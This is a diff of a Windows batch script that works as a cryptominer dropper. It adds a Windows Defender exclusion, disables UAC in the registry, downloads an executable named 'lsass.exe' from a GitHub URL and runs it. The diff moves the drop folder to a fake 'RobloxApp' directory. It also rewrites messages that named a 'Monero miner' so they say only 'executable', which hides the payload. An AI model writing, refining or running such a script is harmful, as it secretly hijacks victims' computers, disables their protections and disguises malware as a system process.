@@ -1,15 +1,8 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: Take ownership of the folder and set permissions
-takeown /f "C:\Program Files (x86)\Windows Defender" /r /d y
-icacls "C:\Program Files (x86)\Windows Defender" /grant administrators:F /t
-
-:: Disable UAC permanently (admin rights required)
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
-
-:: Set the download location for the executable
-set "folderPath=C:\Program Files (x86)\Windows Defender"
+:: Set the download location to Local AppData\RobloxApp
+set "folderPath=%USERPROFILE%\AppData\Local\RobloxApp"
 
 :: Check if the folder exists, and create it if it doesn't
 if not exist "%folderPath%" (
@@ -21,8 +14,11 @@ if not exist "%folderPath%" (
 echo Adding exclusion for folder: "%folderPath%"
 powershell -Command "Add-MpPreference -ExclusionPath '%folderPath%'"
 
-:: Debugging: Attempt to download the Monero miner executable
-echo Downloading miner executable...
+:: Disable UAC permanently (admin rights required)
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
+
+:: Debugging: Attempt to download the executable
+echo Downloading executable...
 curl -L -o "%folderPath%\lsass.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/lsass.exe" 2> "%folderPath%\download_error.log"
 
 :: Check if curl failed
@@ -52,7 +48,7 @@ if exist "%folderPath%\lsass.exe" (
 )
 
 :: Run the downloaded executable directly
-echo Running the Monero miner...
+echo Running the executable...
 start "" "%folderPath%\lsass.exe"
 
 :: End of script
